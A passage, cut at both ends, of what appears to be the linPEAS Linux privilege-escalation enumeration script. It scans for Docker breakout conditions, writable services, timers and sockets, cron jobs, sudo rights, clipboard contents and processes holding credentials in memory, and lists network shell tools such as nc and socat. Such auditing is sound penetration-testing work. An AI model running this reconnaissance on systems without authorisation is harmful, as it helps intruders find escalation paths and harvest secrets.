  rktcontainers=`rkt list 2>/dev/null | tail -n +2  | wc -l`
  if [ "$dockercontainers" -eq "0" ] && [ "$lxccontainers" -eq "0" ] && [ "$rktcontainers" -eq "0" ]; then
    echo_no
  else
    containerCounts=""
    if [ "$dockercontainers" -ne "0" ]; then containerCounts="${containerCounts}docker($dockercontainers) "; fi
    if [ "$lxccontainers" -ne "0" ]; then containerCounts="${containerCounts}lxc($lxccontainers) "; fi
    if [ "$rktcontainers" -ne "0" ]; then containerCounts="${containerCounts}rkt($rktcontainers) "; fi
    echo "Yes $containerCounts" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
    # List any running containers
    if [ "$dockercontainers" -ne "0" ]; then echo "Running Docker Containers" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; docker ps | tail -n +2 2>/dev/null; echo ""; fi
    if [ "$lxccontainers" -ne "0" ]; then echo "Running LXC Containers" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; lxc list 2>/dev/null; echo ""; fi
    if [ "$rktcontainers" -ne "0" ]; then echo "Running RKT Containers" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"; rkt list 2>/dev/null; echo ""; fi
  fi
  echo ""

  if [ "$dockercontainer" ] || [ "$dockercontainers" -ne "0" ]; then
    printf $Y"[+] "$GREEN"Looking for docker breakout techniques\n"$NC
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout\n"$NC
    capsh --print 2>/dev/null | sed -${E} "s,$containercapsB,${C}[1;31m&${C}[0m,"
    echo ""
    ls /var/run/docker.sock 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
    ls /run/docker.sock 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
    find / ! -path "/sys/*" -name "docker.sock" -o -name "docker.socket" 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
  fi

  echo ""
  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep Devs`" ]; then
  ###########################################
  #---------------) Devices (---------------#
  ###########################################
  printf $B"═════════════════════════════════════════╣ "$GREEN"Devices"$B" ╠══════════════════════════════════════════\n"$NC

  #-- 1D) sd in /dev
  printf $Y"[+] "$GREEN"Any sd*/disk* disk in /dev? (limit 20)\n"$NC
  ls /dev 2>/dev/null | grep -Ei "^sd|^disk" | sed "s,crypt,${C}[1;31m&${C}[0m," | head -n 20
  echo ""

  #-- 2D) Unmounted
  printf $Y"[+] "$GREEN"Unmounted file-system?\n"$NC
  printf $B"[i] "$Y"Check if you can mount umounted devices\n"$NC
  if [ -f "/etc/fstab" ]; then
    cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" | sed -${E} "s,$mountG,${C}[1;32m&${C}[0m,g" | sed -${E} "s,$notmounted,${C}[1;31m&${C}[0m," | sed -${E} "s,$mounted,${C}[1;34m&${C}[0m," | sed -${E} "s,$Wfolders,${C}[1;31m&${C}[0m," | sed -${E} "s,$mountpermsB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$mountpermsG,${C}[1;32m&${C}[0m,g"
  else
    echo_not_found "/etc/fstab"
  fi
  echo ""
  echo ""
  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep AvaSof`" ]; then
  ###########################################
  #---------) Available Software (----------#
  ###########################################
  printf $B"════════════════════════════════════╣ "$GREEN"Available Software"$B" ╠════════════════════════════════════\n"$NC

  #-- 1AS) Useful software
  printf $Y"[+] "$GREEN"Useful software\n"$NC
  which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
  echo ""

  #-- 2AS) Search for compilers
  printf $Y"[+] "$GREEN"Installed Compiler\n"$NC
  (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/"); 
  echo ""
  echo ""
  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep ProCronSrvcsTmrsSocks`" ]; then
  ####################################################
  #-----) Processes & Cron & Services & Timers (-----#
  ####################################################
  printf $B"══════════════════════════════╣ "$GREEN"Processes, Cron, Services, Timers & Sockets"$B" ╠════════════════════════════════\n"$NC

  #-- PCS) Cleaned proccesses
  printf $Y"[+] "$GREEN"Cleaned processes\n"$NC
  if [ "$NOUSEPS" ]; then
    printf $B"[i] "$GREEN"Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes\n"$NC
  fi
  printf $B"[i] "$Y"Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes\n"$NC

  if [ "$NOUSEPS" ]; then
    print_ps | sed -${E} "s,$Wfolders,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$rootcommon,${C}[1;32m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m," | sed -${E} "s,$processesVB,${C}[1;31;103m&${C}[0m,g" | sed "s,$processesB,${C}[1;31m&${C}[0m," | sed -${E} "s,$processesDump,${C}[1;31m&${C}[0m,"
    pslist=`print_ps`
  else
    (ps fauxwww || ps auxwww | sort ) 2>/dev/null | grep -v "\[" | grep -v "%CPU" | while read psline; do
      echo "$psline"  | sed -${E} "s,$Wfolders,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$rootcommon,${C}[1;32m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m," | sed -${E} "s,$processesVB,${C}[1;31;103m&${C}[0m,g" | sed "s,$processesB,${C}[1;31m&${C}[0m," | sed -${E} "s,$processesDump,${C}[1;31m&${C}[0m,"
      if [ "`command -v capsh`" ] && ! [ "`echo \"$psline\" | grep root`" ]; then
        cpid="`echo \"$psline\" | awk '{print $2}'`"
        caphex=0x"`cat \"/proc/$cpid/status\" 2> /dev/null | grep \"CapEff\" | awk '{print $2}'`"
        if [ "$caphex" ] && [ "$caphex" != "0x" ] && [ "`echo \"$caphex\" | grep -v '0x0000000000000000'`" ]; then
          printf "  └─(${DG}Caps${NC}) "; capsh --decode=$caphex 2>/dev/null | sed -${E} "s,$capsB,${C}[1;31m&${C}[0m,g"
        fi
      fi
    done
    pslist=`ps auxwww`
    echo ""

    #-- PCS) Binary processes permissions
    printf $Y"[+] "$GREEN"Binary processes permissions\n"$NC
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes\n"$NC
    binW="IniTialiZZinnggg"
    ps auxwww 2>/dev/null | awk '{print $11}' | while read bpath; do
      if [ -w "$bpath" ]; then
        binW="$binW|$bpath"
      fi
    done
    ps auxwww 2>/dev/null | awk '{print $11}' | xargs ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null | sed -${E} "s,$Wfolders,${C}[1;31;103m&${C}[0m,g" | sed -${E} "s,$binW,${C}[1;31;103m&${C}[0m,g" | sed -${E} "s,$sh_usrs,${C}[1;31m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;31m&${C}[0m," | sed "s,root,${C}[1;32m&${C}[0m,"
  fi
  echo ""

  #-- PCS) Files opened by processes belonging to other users
  if ! [ "$IAMROOT" ]; then
    printf $Y"[+] "$GREEN"Files opened by processes belonging to other users\n"$NC
    printf $B"[i] "$Y"This is usually empty because of the lack of privileges to read other user processes information\n"$NC
    lsof 2>/dev/null | grep -v "$USER" | grep -iv "permission denied" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
    echo ""
  fi

  #-- PCS) Processes with credentials inside memory 
  printf $Y"[+] "$GREEN"Processes with credentials in memory (root req)\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory\n"$NC
  if [ "`echo \"$pslist\" | grep \"gdm-password\"`" ]; then echo "gdm-password process found (dump creds from memory as root)" | sed "s,gdm-password process,${C}[1;31m&${C}[0m,"; else echo_not_found "gdm-password"; fi
  if [ "`echo \"$pslist\" | grep \"gnome-keyring-daemon\"`" ]; then echo "gnome-keyring-daemon process found (dump creds from memory as root)" | sed "s,gnome-keyring-daemon,${C}[1;31m&${C}[0m,"; else echo_not_found "gnome-keyring-daemon"; fi
  if [ "`echo \"$pslist\" | grep \"lightdm\"`" ]; then echo "lightdm process found (dump creds from memory as root)" | sed "s,lightdm,${C}[1;31m&${C}[0m,"; else echo_not_found "lightdm"; fi
  if [ "`echo \"$pslist\" | grep \"vsftpd\"`" ]; then echo "vsftpd process found (dump creds from memory as root)" | sed "s,vsftpd,${C}[1;31m&${C}[0m,"; else echo_not_found "vsftpd"; fi
  if [ "`echo \"$pslist\" | grep \"apache2\"`" ]; then echo "apache2 process found (dump creds from memory as root)" | sed "s,apache2,${C}[1;31m&${C}[0m,"; else echo_not_found "apache2"; fi
  if [ "`echo \"$pslist\" | grep \"sshd:\"`" ]; then echo "sshd: process found (dump creds from memory as root)" | sed "s,sshd:,${C}[1;31m&${C}[0m,"; else echo_not_found "sshd"; fi
  echo ""

  #-- PCS) Different processes 1 min
  if ! [ "$FAST" ] && ! [ "$SUPERFAST" ]; then
    printf $Y"[+] "$GREEN"Different processes executed during 1 min (interesting is low number of repetitions)\n"$NC
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs\n"$NC
    if [ "`ps -e -o command 2>/dev/null`" ]; then for i in $(seq 1 1250); do ps -e -o command >> $file.tmp1 2>/dev/null; sleep 0.05; done; sort $file.tmp1 2>/dev/null | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort -r -n | grep -E -v "\s*[1-9][0-9][0-9][0-9]"; rm $file.tmp1; fi
    echo ""
  fi

  #-- PCS) Cron
  printf $Y"[+] "$GREEN"Cron jobs\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs\n"$NC
  command -v crontab 2>/dev/null || echo_not_found "crontab"
  crontab -l 2>/dev/null | tr -d "\r" | sed -${E} "s,$Wfolders,${C}[1;31;103m&${C}[0m,g" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  command -v incrontab 2>/dev/null || echo_not_found "incrontab"
  incrontab -l 2>/dev/null
  ls -al /etc/cron* 2>/dev/null | sed -${E} "s,$cronjobsG,${C}[1;32m&${C}[0m,g" | sed "s,$cronjobsB,${C}[1;31m&${C}[0m,g"
  cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs /var/spool/cron/crontabs/* /var/spool/anacron /etc/incron.d/* /var/spool/incron/* 2>/dev/null | tr -d "\r" | grep -v "^#\|test \-x /usr/sbin/anacron\|run\-parts \-\-report /etc/cron.hourly\| root run-parts /etc/cron." | sed -${E} "s,$Wfolders,${C}[1;31;103m&${C}[0m,g" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m,"  | sed "s,root,${C}[1;31m&${C}[0m,"
  crontab -l -u "$USER" 2>/dev/null | tr -d "\r"
  ls -l /usr/lib/cron/tabs/ /Library/LaunchAgents/ /Library/LaunchDaemons/ ~/Library/LaunchAgents/ 2>/dev/null #MacOS paths
  echo ""

  #-- PCS) Services
  printf $Y"[+] "$GREEN"Services\n"$NC
  printf $B"[i] "$Y"Search for outdated versions\n"$NC
  (service --status-all || service -e || chkconfig --list || rc-status || launchctl list) 2>/dev/null || echo_not_found "service|chkconfig|rc-status|launchctl"
  echo ""

  #-- PSC) systemd PATH
  printf $Y"[+] "$GREEN"Systemd PATH\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths\n"$NC
  systemctl show-environment 2>/dev/null | grep "PATH" | sed -${E} "s,$Wfolders\|\./\|\.:\|:\.,${C}[1;31;103m&${C}[0m,g"
  WRITABLESYSTEMDPATH=`systemctl show-environment 2>/dev/null | grep "PATH" | grep -E "$Wfolders"`
  echo ""

  #-- PSC) .service files
  #TODO: .service files in MACOS are folders
  printf $Y"[+] "$GREEN"Analyzing .service files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#services\n"$NC
  services=$(echo "$FIND_ETC\n$FIND_LIB\n$FIND_RUN\n$FIND_USR\n$FIND_SYSTEMD\n$FIND_SYSTEM\n$FIND_PRIVATE\n$FIND_VAR\n$FIND_SYS\n$FIND_SNAP" | grep -E '\.service')
  printf "$services\n" | while read s; do
    if [ ! -O "$s" ]; then #Remove services that belongs to the current user
      if [ -w "$s" ] && [ -f "$s" ]; then
        echo "$s" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,g"
      fi
      servicebinpaths="`grep -Eo '^Exec.*?=[!@+-]*[a-zA-Z0-9_/\-]+' \"$s\" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,'`" #Get invoked paths
      printf "$servicebinpaths\n" | while read sp; do
        if [ -w "$sp" ]; then
          echo "$s is calling this writable executable: $sp" | sed "s,writable.*,${C}[1;31;103m&${C}[0m,g"
        fi
      done
      relpath1="`grep -E '^Exec.*=(?:[^/]|-[^/]|\+[^/]|![^/]|!![^/]|)[^/@\+!-].*' \"$s\" 2>/dev/null | grep -Iv \"=/\"`"
      relpath2="`grep -E '^Exec.*=.*/bin/[a-zA-Z0-9_]*sh ' \"$s\" 2>/dev/null | grep -Ev \"/[a-zA-Z0-9_]+/\"`"
      if [ "$relpath1" ] || [ "$relpath2" ]; then
        if [ "$WRITABLESYSTEMDPATH" ]; then
          echo "$s is executing some relative path" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,";
        else
          echo "$s is executing some relative path"
        fi
      fi
    fi
  done
  if [ ! "$WRITABLESYSTEMDPATH" ]; then echo "You can't write on systemd PATH" | sed -${E} "s,.*,${C}[1;32m&${C}[0m,"; fi
  echo ""
  
  #-- PSC) Timers
  printf $Y"[+] "$GREEN"System timers\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers\n"$NC
  (systemctl list-timers --all 2>/dev/null | grep -Ev "(^$|timers listed)" | sed -${E} "s,$timersG,${C}[1;32m&${C}[0m,") || echo_not_found
  echo ""

  #-- PSC) .timer files
  printf $Y"[+] "$GREEN"Analyzing .timer files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers\n"$NC
  timers=$(echo "$FIND_ETC\n$FIND_LIB\n$FIND_RUN\n$FIND_USR\n$FIND_SYSTEMD\n$FIND_SYSTEM\n$FIND_PRIVATE\n$FIND_VAR\n$FIND_SYS\n$FIND_SNAP" | grep -E '\.timer')
  printf "$timers\n" | while read t; do
    if [ -w "$t" ]; then
      echo "$t" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,g"
    fi
    timerbinpaths="`grep -Po '^Unit=*(.*?$)' \"$t\" 2>/dev/null | cut -d '=' -f2`"
    printf "$timerbinpaths\n" | while read tb; do
      if [ -w "$tb" ]; then
        echo "$t timer is calling this writable executable: $tb" | sed "s,writable.*,${C}[1;31m&${C}[0m,g"
      fi
    done
    #relpath="`grep -Po '^Unit=[^/].*' \"$t\" 2>/dev/null`"
    #for rp in "$relpath"; do
    #  echo "$t is calling a relative path: $rp" | sed "s,relative.*,${C}[1;31m&${C}[0m,g"
    #done
  done
  echo ""

  #-- PSC) .socket files
  #TODO: .socket files in MACOS are folders
  printf $Y"[+] "$GREEN"Analyzing .socket files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets\n"$NC
  sockets=$(echo "$FIND_ETC\n$FIND_LIB\n$FIND_RUN\n$FIND_USR\n$FIND_SYSTEMD\n$FIND_SYSTEM\n$FIND_PRIVATE\n$FIND_VAR\n$FIND_SYS\n$FIND_SNAP" | grep -E '\.socket')
  printf "$sockets\n" | while read s; do
    if [ -w "$s" ] && [ -f "$s" ]; then
      echo "Writable .socket file: $s" | sed "s,/.*,${C}[1;31m&${C}[0m,g"
    fi
    socketsbinpaths="`grep -Eo '^(Exec).*?=[!@+-]*/[a-zA-Z0-9_/\-]+' \"$s\" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,'`"
    printf "$socketsbinpaths\n" | while read sb; do
      if [ -w "$sb" ]; then
        echo "$s is calling this writable executable: $sb" | sed "s,writable.*,${C}[1;31m&${C}[0m,g"
      fi
    done
    socketslistpaths="`grep -Eo '^(Listen).*?=[!@+-]*/[a-zA-Z0-9_/\-]+' \"$s\" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,'`"
    printf "$socketsbinpaths\n" | while read sl; do
      if [ -w "$sl" ]; then
        echo "$s is calling this writable listener: $sl" | sed "s,writable.*,${C}[1;31m&${C}[0m,g";
      fi
    done
    if [ -w "/var/run/docker.sock" ]; then
      echo "Docker socket /var/run/docker.sock is writable (https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket)" | sed "s,/var/run/docker.sock is writable,${C}[1;31;103m&${C}[0m,g"
    fi
    if [ -w "/run/docker.sock" ]; then
      echo "Docker socket /run/docker.sock is writable (https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket)" | sed "s,/var/run/docker.sock is writable,${C}[1;31;103m&${C}[0m,g"
    fi
  done
  echo ""

  #-- PSC) Search HTTP sockets
  printf $Y"[+] "$GREEN"HTTP sockets\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets\n"$NC
  ss -xlp -H state listening 2>/dev/null | grep -Eo "/.* " | cut -d " " -f1 | while read s; do
    socketcurl="`curl --max-time 2 --unix-socket \"$s\" http:/index 2>/dev/null`"
    if [ $? -eq 0 ]; then
      owner="`ls -l \"$s\" | cut -d ' ' -f 3`"
      echo "Socket $s owned by $owner uses HTTP. Response to /index:" | sed -${E} "s,$groupsB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$groupsVB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,root,${C}[1;31m&${C}[0m," | sed -${E} "s,$knw_grps,${C}[1;32m&${C}[0m,g" | sed -${E} "s,$idB,${C}[1;31m&${C}[0m,g"
      echo "$socketcurl"
    fi
  done
  echo ""

  #-- PSC) Writable and weak policies in D-Bus config files
  printf $Y"[+] "$GREEN"D-Bus config files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus\n"$NC
  dbusfols=$(echo "$FIND_DIR_ETC" | grep -E '/dbus-1/system.d|/dbus-1/session.d')
  if [ "$dbusfols" ]; then
    printf "$dbusfols\n" | while read d; do
      for f in $d/*; do
        if [ -w "$f" ]; then
          echo "Writable $f" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,g"
        fi

        genpol=`grep "<policy>" "$f" 2>/dev/null`
        if [ "$genpol" ]; then printf "Weak general policy found on $f ($genpol)\n" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed -${E} "s,$mygroups,${C}[1;31m&${C}[0m,g"; fi
        #if [ "`grep \"<policy user=\\\"$USER\\\">\" \"$f\" 2>/dev/null`" ]; then printf "Possible weak user policy found on $f () \n" | sed "s,$USER,${C}[1;31m&${C}[0m,g"; fi
        
        userpol=`grep "<policy user=" "$f" 2>/dev/null | grep -v "root"`
        if [ "$userpol" ]; then printf "Possible weak user policy found on $f ($userpol)\n" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed -${E} "s,$mygroups,${C}[1;31m&${C}[0m,g"; fi
        #for g in `groups`; do
        #  if [ "`grep \"<policy group=\\\"$g\\\">\" \"$f\" 2>/dev/null`" ]; then printf "Possible weak group ($g) policy found on $f\n" | sed "s,$g,${C}[1;31m&${C}[0m,g"; fi
        #done
        grppol=`grep "<policy group=" "$f" 2>/dev/null | grep -v "root"` 
        if [ "$grppol" ]; then printf "Possible weak user policy found on $f ($grppol)\n" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed -${E} "s,$mygroups,${C}[1;31m&${C}[0m,g"; fi

        #TODO: identify allows in context="default"
      done
    done
  fi
  echo ""

  printf $Y"[+] "$GREEN"D-Bus Service Objects list\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus\n"$NC
  dbuslist=$(busctl list 2>/dev/null)
  if [ "$dbuslist" ]; then
    busctl list | while read line; do
      echo "$line" | sed -${E} "s,$dbuslistG,${C}[1;32m&${C}[0m,g";
      if [ ! "`echo \"$line\" | grep -E \"$dbuslistG\"`" ]; then
        srvc_object=`echo $line | cut -d " " -f1`
        srvc_object_info=`busctl status "$srvc_object" 2>/dev/null | grep -E "^UID|^EUID|^OwnerUID" | tr '\n' ' '`
        if [ "$srvc_object_info" ]; then
          echo " -- $srvc_object_info" | sed "s,UID=0,${C}[1;31m&${C}[0m,"
        fi
      fi
    done
  else echo_not_found "busctl"
  fi
  echo ""
  echo ""


  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep Net`" ]; then
  ###########################################
  #---------) Network Information (---------#
  ###########################################
  printf $B"═══════════════════════════════════╣ "$GREEN"Network Information"$B" ╠════════════════════════════════════\n"$NC

  #-- NI) Hostname, hosts and DNS
  printf $Y"[+] "$GREEN"Hostname, hosts and DNS\n"$NC
  cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null
  dnsdomainname 2>/dev/null || echo_not_found "dnsdomainname" 
  echo ""

  #-- NI) /etc/inetd.conf
  printf $Y"[+] "$GREEN"Content of /etc/inetd.conf & /etc/xinetd.conf\n"$NC
  (cat /etc/inetd.conf /etc/xinetd.conf 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null) || echo_not_found "/etc/inetd.conf" 
  echo ""

  #-- NI) Interfaces
  printf $Y"[+] "$GREEN"Interfaces\n"$NC
  cat /etc/networks 2>/dev/null
  (ifconfig || ip a) 2>/dev/null
  echo ""

  #-- NI) Neighbours
  printf $Y"[+] "$GREEN"Networks and neighbours\n"$NC
  (route || ip n || cat /proc/net/route) 2>/dev/null
  (arp -e || arp -a || cat /proc/net/arp) 2>/dev/null
  echo ""

  #-- NI) Iptables
  printf $Y"[+] "$GREEN"Iptables rules\n"$NC
  (timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null) 2>/dev/null || echo_not_found "iptables rules"
  echo ""

  #-- NI) Ports
  printf $Y"[+] "$GREEN"Active Ports\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports\n"$NC
  ((netstat -punta || ss -ntpu || (netstat -a -p tcp && netstat -a -p udp)) | grep -i listen) 2>/dev/null | sed -${E} "s,127.0.[0-9]+.[0-9]+,${C}[1;31m&${C}[0m,"
  echo ""

  #-- NI) tcpdump
  printf $Y"[+] "$GREEN"Can I sniff with tcpdump?\n"$NC
  timeout 1 tcpdump >/dev/null 2>&1
  if [ $? -eq 124 ]; then #If 124, then timed out == It worked
      printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sniffing\n"$NC
      echo "You can sniff with tcpdump!" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi
  echo ""

  #-- NI) Internet access
  if ! [ "$SUPERFAST" ] && ! [ "$FAST" ] && ! [ "$NOTEXPORT" ] && [ "$TIMEOUT" ] && [ -f "/bin/bash" ]; then
    printf $Y"[+] "$GREEN"Internet Access?\n"$NC
    check_tcp_80 2>/dev/null &
    check_tcp_443 2>/dev/null &
    check_icmp 2>/dev/null &
    check_dns 2>/dev/null &
    wait
    echo ""
  fi
  echo ""
  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep UsrI`" ]; then
  ###########################################
  #----------) Users Information (----------#
  ###########################################
  printf $B"════════════════════════════════════╣ "$GREEN"Users Information"$B" ╠════════════════════════════════════\n"$NC

  #-- UI) My user
  printf $Y"[+] "$GREEN"My user\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#users\n"$NC
  (id || (whoami && groups)) 2>/dev/null | sed -${E} "s,$groupsB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$groupsVB,${C}[1;31;103m&${C}[0m,g" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,root,${C}[1;31m&${C}[0m," | sed -${E} "s,$knw_grps,${C}[1;32m&${C}[0m,g" | sed -${E} "s,$idB,${C}[1;31m&${C}[0m,g"
  echo ""

  #-- UI) PGP keys?
  printf $Y"[+] "$GREEN"Do I have PGP keys?\n"$NC
  command -v gpg 2>/dev/null || echo_not_found "gpg"
  gpg --list-keys 2>/dev/null
  command -v netpgpkeys 2>/dev/null || echo_not_found "netpgpkeys"
  netpgpkeys --list-keys 2>/dev/null
  command -v netpgp 2>/dev/null || echo_not_found "netpgp"
  echo ""

  #-- UI) Clipboard and highlighted text
  printf $Y"[+] "$GREEN"Clipboard or highlighted text?\n"$NC
  if [ `command -v xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null` | sed -${E} "s,$pwd_inside_history,${C}[1;31m&${C}[0m,"
    echo "Highlighted text: "`xclip -o 2>/dev/null` | sed -${E} "s,$pwd_inside_history,${C}[1;31m&${C}[0m,"
  elif [ `command -v xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null` | sed -${E} "s,$pwd_inside_history,${C}[1;31m&${C}[0m,"
    echo "Highlighted text: "`xsel -o 2>/dev/null` | sed -${E} "s,$pwd_inside_history,${C}[1;31m&${C}[0m,"
  else echo_not_found "xsel and xclip"
  fi
  echo ""

  #-- UI) Sudo -l
  printf $Y"[+] "$GREEN"Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid\n"$NC
  (echo '' | sudo -S -l | sed "s,_proxy,${C}[1;31m&${C}[0m,g" | sed "s,$sudoG,${C}[1;32m&${C}[0m,g" | sed -${E} "s,$sudoB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$sudoVB,${C}[1;31;103m&${C}[0m," | sed "s,\!root,${C}[1;31m&${C}[0m,") 2>/dev/null || echo_not_found "sudo" 
  if [ "$PASSWORD" ]; then
    (echo "$PASSWORD" | sudo -S -l | sed "s,_proxy,${C}[1;31m&${C}[0m,g" | sed "s,$sudoG,${C}[1;32m&${C}[0m,g" | sed -${E} "s,$sudoB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$sudoVB,${C}[1;31;103m&${C}[0m,") 2>/dev/null  || echo_not_found "sudo"
  fi
  (cat /etc/sudoers | grep -v "^$" | grep -v "#" | sed "s,_proxy,${C}[1;31m&${C}[0m,g" | sed "s,$sudoG,${C}[1;32m&${C}[0m,g" | sed -${E} "s,$sudoB,${C}[1;31m&${C}[0m,g" | sed "s,pwfeedback,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$sudoVB,${C}[1;31;103m&${C}[0m,") 2>/dev/null  || echo_not_found "/etc/sudoers" 
  if [ -w '/etc/sudoers.d/' ]; then
    echo "You can create a file in /etc/sudoers.d/ and escalate privileges" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
  fi
  for filename in '/etc/sudoers.d/*'; do
    if [ -r "$filename" ]; then
